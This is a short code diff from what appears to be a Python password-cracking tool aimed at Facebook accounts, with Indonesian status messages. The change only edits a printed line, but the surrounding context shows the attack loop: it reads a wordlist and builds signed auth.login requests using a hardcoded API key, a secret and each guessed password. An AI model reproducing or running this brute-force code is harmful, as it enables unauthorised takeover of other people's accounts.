@@ -51,7 +51,7 @@ try:
 		print(" [+] Loadaing: {}".format(len(open(passlist,"r").read().split("\n"))))
 		print(" [+] Cracking, Mohon Tunggu...")
 		for passwd in open(passlist,'r').readlines():
-			sys.stdout.write(u"\u001b[1000D[*] Trying {}".format(passwd.strip()))
+			sys.stdout.write(u"\u001b[1000D [*] Mencoba {}".format(passwd.strip()))
 			sys.stdout.flush()
 			sig = "api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail={}format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword={}return_ssl_resources=0v=1.0{}".format(userid,passwd.strip(),API_SECRET)
 			xx = hashlib.md5(sig).hexdigest()
